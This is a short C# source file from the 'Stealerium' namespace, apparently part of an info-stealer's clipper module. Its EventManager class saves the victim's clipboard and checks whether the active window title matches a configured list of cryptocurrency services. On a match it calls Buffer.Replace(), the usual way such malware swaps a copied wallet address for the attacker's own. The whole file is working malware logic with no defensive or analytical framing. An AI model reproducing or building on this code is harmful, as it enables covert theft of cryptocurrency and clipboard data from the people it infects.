using Stealerium.Modules;

namespace Stealerium.Clipper;

internal sealed class EventManager
{
	public static void Action()
	{
		Logger.SaveClipboard();
		if (Detect())
		{
			Buffer.Replace();
		}
	}

	private static bool Detect()
	{
		string[] cryptoServices = Config.CryptoServices;
		int num = 0;
		while (true)
		{
			if (num < cryptoServices.Length)
			{
				string value = cryptoServices[num];
				if (WindowManager.ActiveWindow.ToLower().Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}
}
